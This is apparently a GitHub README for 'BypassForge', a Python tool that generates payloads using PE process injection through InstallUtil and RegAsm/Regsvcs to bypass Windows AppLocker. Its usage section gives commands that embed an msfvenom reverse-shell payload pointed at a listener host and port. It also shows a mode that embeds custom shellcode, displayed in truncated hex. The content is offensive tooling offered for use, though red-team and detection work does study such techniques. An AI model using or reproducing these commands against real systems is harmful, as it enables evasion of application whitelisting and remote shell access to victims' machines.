# BypassForge
Generate Payloads utilizing Process Injection techniques for Living-off-the-Land Applocker Bypass Executables like InstallUtil and RegAsm/Regsvcs in Windows. Currently only two LOL Binaries are supported (InstallUtil & RegAsm/Regsvcs) along with one Process Injection technique (PE Injection). Later on, other techniques and binaries will be added to the tool.

# Example Usage
The script can be used in two modes:
- **MSF Mode**
- 
Parameters like listener IP, listener port and MSF payload type are specified, based on which MSFVenom payload is generated and added to the final binary.
```
python BypassForge.py -b InstallUtil,RegAsm -lh 127.0.0.1 -lp 8080 --payload windows/x64/shell_reverse_tcp
```
![image](https://github.com/user-attachments/assets/047de769-d90f-4350-b7c9-96ce3382d891)


- **Custom Shellcode Mode**
- 
Custom shellcode which are created using 3rd party tools like micr0_shell (https://github.com/senzee1984/micr0_shell) or manually created is specified. This shellcode is added to the final payload binary.
```
python BypassForge.py -b InstallUtil,RegAsm --custom --hex-shellcode 4831d265488b42604<SNIP>c9515151514989c84989c9ffd0
```
![image](https://github.com/user-attachments/assets/c60a0235-f614-4823-9fc9-606c4f5e59be)
